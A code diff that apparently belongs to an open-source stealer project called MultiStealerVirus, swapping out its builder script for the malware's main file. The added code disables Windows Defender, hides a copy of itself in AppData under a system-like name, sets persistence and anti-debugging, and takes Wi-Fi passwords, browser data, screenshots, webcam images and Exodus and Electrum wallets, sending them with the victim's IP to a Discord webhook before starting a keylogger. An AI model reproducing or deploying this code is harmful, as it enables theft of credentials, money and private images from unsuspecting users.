@@ -1,167 +1,274 @@
-import subprocess
-import os
-import shutil
-from colorama import Fore, Style
+from modules.browser import run
+from modules.browser import delete_files
+from modules.info import start
+from modules.wifi import WifiPasswords
+from modules.keylogger import Keylogger
+from modules.startup import Startup
+from modules.antidebug import Antidebug
+#from tkinter import messagebox
+#from threading import Thread
 import sys
-import time
+import os
+import zipfile
+import subprocess
+import discord
+from discord import File, SyncWebhook
+import socket
 import requests
-from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn, TimeElapsedColumn
+from config import DEFENDER, ERROR, KEYLOGGER, STARTUP, WEBHOOK, ANTIDEBUG, MOVE
+#from modules.wallet import wallets
 
 
-def create_env(dir):
-    progress.start()
-    task = progress.add_task("Creating env...", total=1)
-    files = ["main.py", "modules/browser.py", "modules/antidebug.py", "modules/info.py", "modules/wifi.py", "modules/startup.py", "modules/keylogger.py"]
-    path = os.path.join(os.getcwd(), dir)
+if ANTIDEBUG:
+    try: Antidebug
+    except: pass
+
+def disable_defender():
+    #C:\> Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && Set-MpPreference -SubmitSamplesConsent 2
+    cmd = "powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && powershell Set-MpPreference -SubmitSamplesConsent 2"
+    try:
+        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
+    except:
+        pass
     
-    if not os.path.exists(path):
-        progress.stop()
-        print(f"[-] Failed to make build env please make sure that you have source code in '{path}' folder!")
-        time.sleep(3)
-        sys.exit(1)
+if DEFENDER:
+    disable_defender()
+
+
+#def error():
+#    messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occurred while importing modules.")  
+#    
+#    
+#if ERROR:
+#    error_t = Thread(target=error).start()
+
+
+def copyfile(file, target):
+    with open(file, "rb") as f:
+        bins = f.read()
         
-    os.mkdir(os.path.join(os.getcwd(), "build", "modules"))
-    
-    for file in files:
+    with open(target, "wb") as f:
+        f.write(bins)
+
+
+file_dir = sys.argv[0]
+
+#C:\Users\Korisnik\AppData\Roaming\MicrosoftWindows\System
+
+def move():
+    try:
+        target_dir = f"{os.getenv('appdata')}\MicrosoftWindows\System"
+        
+        if not os.path.exists(target_dir):
+            os.mkdir(f"{os.getenv('appdata')}\MicrosoftWindows")
+            os.mkdir(target_dir)
+        
+        #shutil.copyfile(file_dir, f"{target_dir}\SystemBin_64bit.exe")
+
+        copyfile(file_dir, f"{target_dir}\SystemBin_64bit.exe")
+
         try:
-            shutil.copyfile(f"{path}/{file}", f"build/{file}")
-        except:
-            progress.stop()
-            print(f"[-] Failed to make build env please make sure that you have source code in '{path}' folder!")
-            time.sleep(3)
-            sys.exit(1)
-    
-    progress.update(task, advance=1)
-
-
-def obfuscate():
-    task1 = progress.add_task("Obfuscating...", total=1)
-    try:
-        subprocess.run(f"pyminifier -o build/main.py build/main.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# main.py
-        subprocess.run(f"pyminifier -o build/modules/browser.py build/modules/browser.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/browser.py
-        subprocess.run(f"pyminifier -o build/modules/info.py build/modules/info.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/info.py
-        subprocess.run(f"pyminifier -o build/modules/startup.py build/modules/startup.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/startup.py
-        subprocess.run(f"pyminifier -o build/modules/antidebug.py build/modules/antidebug.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/antidebug.py
-        subprocess.run(f"pyminifier -o build/modules/wifi.py build/modules/wifi.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/wifi.py
-        subprocess.run(f"pyminifier -o build/modules/keylogger.py build/modules/keylogger.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/keylogger.py
-        progress.update(task1, advance=1)
-    except:
-        progress.stop()
-        print("[-] To obfuscate please install pyminifier or disable obfuscation from building options!")
-        time.sleep(3)
-        sys.exit(1)
-    
-
-def build(path, icon, upx=True, obf=True):
-    create_env(path)
-    if obf: obfuscate()
-    task2 = progress.add_task("Compiling...", total=1)
-    
-    if upx:
-        UpxArg = "--upx-dir C:/UPX"
-    else:
-        UpxArg = ""
-    
-    try:
-        subprocess.run(f"pyinstaller  --onefile -w -i {icon} --clean {UpxArg} build/main.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
-        try:
-            shutil.rmtree(os.path.join(os.getcwd(), "build"))
-            os.remove(os.path.join(os.getcwd(), "main.spec"))
-        except: 
-            pass
-        progress.update(task2, advance=1)
-        progress.stop()
-        print(Fore.GREEN +"[+] All done!"+ Style.RESET_ALL)
-        time.sleep(3)
-    except:
-        progress.stop()
-        print(Fore.RED +"[-] Please make sure you have pyinstaller, pyminifier and UPX installed under C:/UPX!"+ Style.RESET_ALL)
-        time.sleep(3)
-        sys.exit(1)
-    
-    
-def convert(value, name):
-    if value.lower() == "y":
-        return True
-    elif value.lower() == "n":
-        return False
-    else:
-        print(Fore.RED +f"[-] Choice for {name} is invalid, please enter 'y' for yes or 'n' for no!"+ Style.RESET_ALL)
-        time.sleep(3)
-        sys.exit(0)
-
-
-def config(webhook, webhook_keylogger, interval, startup, keylogger, error, antidebug, defender, move):    
-    config = f"WEBHOOK = '{webhook}'\nWEBHOOK_KEYLOGGER = '{webhook_keylogger}'\nINTERVAL = {interval}\nSTARTUP = {startup}\nKEYLOGGER = {keylogger}\nERROR = {error}\nANTIDEBUG = {antidebug}\nDEFENDER = {defender}\nMOVE = {move}"
-    build_dir = os.path.join(os.getcwd(), "build")
-
-    
-    if os.path.exists(build_dir):
-        shutil.rmtree(build_dir)
-        os.mkdir(build_dir)
-    else:
-        os.mkdir(build_dir)
-    
-    with open(f"build\config.py", "w") as f:
-        f.write(config)
-
-
-def validate(url):
-    try:
-        response = requests.get(url)
-        if response.status_code == 200:
-            return
-        else:
-            print(Fore.RED +"Webhook URL is invalid!"+ Style.RESET_ALL)
-            time.sleep(3)
+            os.chdir(target_dir)
+            subprocess.Popen(f"{target_dir}\SystemBin_64bit.exe", shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
             sys.exit(0)
+        except:
+            pass
     except:
-        print(Fore.RED +"Webhook URL is invalid!"+ Style.RESET_ALL)
-        time.sleep(3)
-        sys.exit(0)
-
-
-progress = Progress(
-    TextColumn("[bold blue]{task.description}", justify="right"),
-    BarColumn(bar_width=None),
-    SpinnerColumn(style="bold", spinner_name="simpleDotsScrolling", speed=1),
-    TimeElapsedColumn()
-)
-
-
-webhook = input("[?] Enter webhook URL for browser info, system info and saved wifi: ")
-validate(webhook)
-error = input("[?] Enable fake error? [Y/n]: ")
-defender = input("[?] Enable win defender disabler? [Y/n]: ")
-startup  = input("[?] Enable startup? [Y/n]: ")
-antidebug = input("[?] Enable antidebug? [Y/n]: ")
-move = input("[?] Move the malware to the special location? [Y/n]: ")
-
-keylogger = input("[?] Enable keylogger? [Y/n]: ")
-if keylogger.lower() == "y":
-    keylogger_webhook = input("[?] Enter webhook URL for keylogger: ")
-    validate(keylogger_webhook)
-    interval = input("[?] Enter interval for keylogger sending (in secondes): ")
-else:
-    keylogger_webhook = "null"
-    interval = 0
+        return
     
+if MOVE and file_dir[:1].upper() + file_dir[1:] != f"{os.getenv('appdata')}\MicrosoftWindows\System\SystemBin_64bit.exe":
+    move()
 
-choice = input("> Do you want to edit building options[y/N]: ")
-if choice.lower() == "y":
-    obf = input("[?] Do you want to enable obfuscation? [Y/n]: ")
-    upx = input("[?] Use UPX? [Y/n]: ")
-    icon = input("[?] Enter icon file: ")
-    path = input("[?] Enter source code directory: ")
+
+if STARTUP:
+    try: Startup(sys.argv[0])
+    except: pass
+
+
+try:
+    start() #system info
+except:
+    pass
+
+try:
+    wifi = WifiPasswords()
+    wifi.run()
+except:
+    pass
+
+try:
+    run() #browser
+except:
+    pass
+
+
+def zip(name, files):
+    try:
+        with zipfile.ZipFile(name, "w") as zip:
+            for file in files:
+                try:
+                    zip.write(file)
+                except:
+                    pass
+    except:
+        pass
+
+
+def send_sys(url):
+    try: webhook = SyncWebhook.from_url(url)
+    except: return
+
+    try:
+        with open("system.txt", "r") as f: sys_info = f.read()
+        with open("wifi.txt", "r") as f: wifi_info = f.read()
+        
+        if wifi_info == "": wifi_info = "No wifi passwords found!"
+        if sys_info == "": sys_info = "Failed to fetch system information!"
+        
+        embed = discord.Embed(title="System", color=0x10131c, description="")
+        embed.add_field(name="System Information", value=f"```{sys_info}```", inline=False)
+        embed.add_field(name="Wifi Information", value=f"```{wifi_info}```", inline=False)
+        embed.set_footer(text="github.com/Josakko/MultiStealerVirus")
+        
+        if os.path.exists(os.path.join(os.getcwd(), "clipboard.txt")):
+            webhook.send(embed=embed, file=discord.File("clipboard.txt"))
+            delete_files(["system.txt", "wifi.txt", "clipboard.txt"])
+        else:
+            webhook.send(embed=embed)
+            delete_files(["system.txt", "wifi.txt"])
+    except: pass
     
-    config(webhook, keylogger_webhook, interval, convert(startup, "startup"), convert(keylogger, "keylogger"), convert(error, "error"), convert(antidebug, "antidebug"), convert(defender, "defender disabler"), convert(move, "move to dedicated location"))
-    build(path, icon, convert(upx, "UPX"), convert(obf, "obfuscation"))
+    if os.path.exists(os.path.join(os.getcwd(), "webcam.png")):
+        embed = discord.Embed(title = "Webcam", color=0x10131c, description="")
+        embed.set_image(url="attachment://webcam.png")
+        embed.set_footer(text="github.com/Josakko/MultiStealerVirus")
+        
+        webhook.send(embed=embed, file=discord.File("webcam.png"))
+        delete_files(["webcam.png"])
     
-elif choice.lower() == "n":
-    config(webhook, keylogger_webhook, interval, convert(startup, "startup"), convert(keylogger, "keylogger"), convert(error, "error"), convert(antidebug, "antidebug"), convert(defender, "defender disabler"), convert(move, "move to dedicated location"))
-    build("src", "icon.ico")
+    if os.path.exists(os.path.join(os.getcwd(), "screenshot.png")):
+        embed = discord.Embed(title = "Screenshot", color=0x10131c, description="")
+        embed.set_image(url="attachment://screenshot.png")
+        embed.set_footer(text="github.com/Josakko/MultiStealerVirus")
+        
+        webhook.send(embed=embed, file=discord.File("screenshot.png"))
+        delete_files(["screenshot.png"])
     
-else:
-    print(Fore.RED +"[-] Your choice was invalid, please enter 'y' for yes or 'n' for no!"+ Style.RESET_ALL)
-    time.sleep(3)
-    sys.exit(0)
+send_sys(WEBHOOK)
+
+
+#zip("System.zip", ["wifi.txt", "system.txt", "screenshot.png", "webcam.png"])
+#delete_files(["wifi.txt", "system.txt"]) #delete_files(["wifi.txt", "system.txt", "screenshot.png"])
+
+zip_files = []
+
+dir = os.getcwd()
+for filename in os.listdir(dir):
+    if filename.endswith(".zip"):
+        with zipfile.ZipFile(os.path.join(dir, filename), "r") as zipfile_:
+            if len(zipfile_.namelist()) != 0:
+                zip_files.append(filename)
+            #if len(zipfile_.namelist()) == 0:
+            #    delete_files([os.path.join(dir, filename)])
+            #else:
+            #    zip_files.append(filename)
+
+
+def send_browser(url, files_dir):
+    try:
+        webhook = SyncWebhook.from_url(url)#https://discord.com/api/webhooks/ID/TOKEN
+    except:
+        return
+
+    try:
+        ip = requests.get("https://api.ipify.org").text
+    except:
+        ip = "Unknown"
+
+    embed = discord.Embed(title="Browser Data", description=f"```Browser Data for: {socket.gethostname()}, {ip}```", color=0x10131c)
+    embed.set_footer(text="github.com/Josakko/MultiStealerVirus")
+    
+    files = []
+    
+    for file in files_dir:
+        try:
+            files.append(File(file))
+        except:
+            pass
+
+    
+    try: webhook.send(embed=embed, files=files)
+    except: pass
+    
+    delete_files(["Chrome.zip", "Brave.zip", "Chromium.zip", "Edge.zip", "Opera.zip", "OperaGX.zip"])
+
+
+try:
+    #send(WEBHOOK, ["Chrome.zip", "Brave.zip", "Chromium.zip", "Edge.zip", "Opera.zip", "OperaGX.zip"], "Browser Data")
+    send_browser(WEBHOOK, zip_files)
+except: pass
+
+
+def wallets(url):
+    webhook = SyncWebhook.from_url(url)
+    
+    EXODUS_DIR = os.path.join(os.getenv("appdata"), "Exodus", "exodus.wallet")
+    ELECTRUM_DIR = os.path.join(os.getenv("appdata"), "Electrum", "wallets")
+    
+    if os.path.exists(EXODUS_DIR):
+        exodus_zip = zipfile.ZipFile("Exodus.zip", "w", zipfile.ZIP_DEFLATED)
+        for root, dirs, files in os.walk(EXODUS_DIR):
+            for file in files:
+                exodus_zip.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), EXODUS_DIR))
+        exodus_zip.close()
+    
+        try:
+            with open("Exodus.zip", "rb") as wallet:
+                wallet_zip = File(wallet, filename=os.path.basename(file))
+                webhook.send(file=wallet_zip)
+        except:
+            embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
+            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+            webhook.send(embed=embed)
+    
+        delete_files(["Exodus.zip"])
+    
+    else:
+        embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
+        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+        webhook.send(embed=embed)
+    
+    if os.path.exists(ELECTRUM_DIR):
+        electrum_zip = zipfile.ZipFile("Electrum.zip", "w", zipfile.ZIP_DEFLATED)
+        for root, dirs, files in os.walk(ELECTRUM_DIR):
+            for file in files:
+                electrum_zip.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), ELECTRUM_DIR))
+        electrum_zip.close()
+    
+        try:
+            with open("Electrum.zip", "rb") as wallet:
+                wallet_zip = File(wallet, filename=os.path.basename(file))
+                webhook.send(file=wallet_zip)
+        except:
+            embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
+            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+            webhook.send(embed=embed)
+    
+        delete_files(["Electrum.zip"])
+    
+    else:
+        embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
+        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+        webhook.send(embed=embed)
+
+try:
+    wallets(WEBHOOK)
+except: pass
+
+
+if KEYLOGGER:
+    try:
+        keyLogger = Keylogger()
+        keyLogger.run()
+    except:
+        pass
